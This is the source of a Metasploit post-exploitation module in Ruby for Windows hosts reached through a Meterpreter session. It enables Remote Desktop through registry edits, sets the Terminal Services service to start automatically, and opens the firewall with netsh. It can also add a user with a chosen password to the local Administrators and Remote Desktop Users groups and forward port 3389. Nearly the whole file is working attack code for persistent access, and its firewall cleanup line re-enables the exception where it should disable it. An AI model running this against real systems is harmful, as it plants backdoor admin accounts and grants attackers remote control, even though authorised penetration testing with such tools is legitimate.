##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/accounts'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Accounts
	include Msf::Post::Windows::Registry
	include Msf::Post::Common
	include Msf::Post::File
	
	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Windows Manage Enable Remote Desktop',
			'Description'   => %q{
					This module enables the Remote Desktop Service (RDP). It provides the options to create
				an account and configure it to be a member of the Local Administrators and
				Remote Desktop Users group. It can also forward the target's port 3389/tcp.},
			'License'       => BSD_LICENSE,
			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
			'Version'       => '$Revision$',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ]
		))

		register_options(
			[
				OptString.new('USERNAME', [ false, 'The username of the user to create.' ]),
				OptString.new('PASSWORD', [ false, 'Password for the user created.' ]),
				OptBool.new(  'ENABLE',   [ false, 'Enable the RDP Service and Firewall Exception.', true]),
				OptBool.new(  'FORDWARD', [ false, 'Forward remote port 3389 to local Port.', false]),
				OptInt.new(   'LPORT',    [ false,  'Local port to fordward remote connection.', 3389])
			], self.class)
	end

	def run
		if datastore['ENABLE'] or (datastore['USERNAME'] and datastore['PASSWORD'])
			cleanup_rc = store_loot("host.windows.cleanup.enable_rdp", "text/plain", session,"" ,
						"enable_rdp_cleanup.rc", "enable_rdp cleanup resource file")

			if datastore['ENABLE']
				enablerd(cleanup_rc)
				enabletssrv(cleanup_rc)
			end
			if datastore['USERNAME'] and datastore['PASSWORD']
				addrdpusr(datastore['USERNAME'], datastore['PASSWORD'],cleanup_rc)
			end
			if datastore['FORDWARD']
				print_status("Starting the port forwarding at local port #{datastore['LPORT']}")
				client.run_cmd("portfwd add -L 0.0.0.0 -l #{datastore['LPORT']} -p 3389 -r 127.0.0.1")
			end
			print_status("For cleanup execute Meterpreter resource file: #{cleanup_rc}")
		end
	end

	def enablerd(cleanup_rc)
		key = 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server'
		value = "fDenyTSConnections"
		begin
			v = registry_getvaldata(key,value)
			print_status "Enabling Remote Desktop"
			if v == 1
				print_status "\tRDP is disabled; enabling it ..."
				registry_setvaldata(key,value,0,"REG_DWORD")
				file_local_write(cleanup_rc,"reg setval -k \'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\' -v 'fDenyTSConnections' -d \"1\"")
			else
				print_status "\tRDP is already enabled"
			end
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end


	def enabletssrv(cleanup_rc)
		rdp_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService"
		begin
			v2 = registry_getvaldata(rdp_key,"Start")
			print_status "Setting Terminal Services service startup mode"
			if v2 != 2
				print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
				service_change_startup("TermService","auto")
				file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
				cmd_exec("sc start termservice")
				file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")

			else
				print_status "\tTerminal Services service is already set to auto"
			end
			#Enabling Exception on the Firewall
			print_status "\tOpening port in local firewall if necessary"
			cmd_exec('netsh firewall set service type = remotedesktop mode = enable')
			file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c 'netsh firewall set service type = remotedesktop mode = enable'\"")
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end



	def addrdpusr(username, password,cleanup_rc)

		rdu = resolve_sid("S-1-5-32-555")[:name]
		admin = resolve_sid("S-1-5-32-544")[:name]

		print_status "Setting user account for logon"
		print_status "\tAdding User: #{username} with Password: #{password}"
		begin
			cmd_exec("net user #{username} #{password} /add")
			file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c net user #{username} /delete\"")
			print_status "\tAdding User: #{username} to local group '#{rdu}'"
			cmd_exec("net localgroup \"#{rdu}\" #{username} /add")

			print_status "\tAdding User: #{username} to local group '#{admin}'"
			cmd_exec("net localgroup #{admin}  #{username} /add")
			print_status "You can now login with the created user"
		rescue::Exception => e
			print_status("The following Error was encountered: #{e.class} #{e}")
		end
	end


end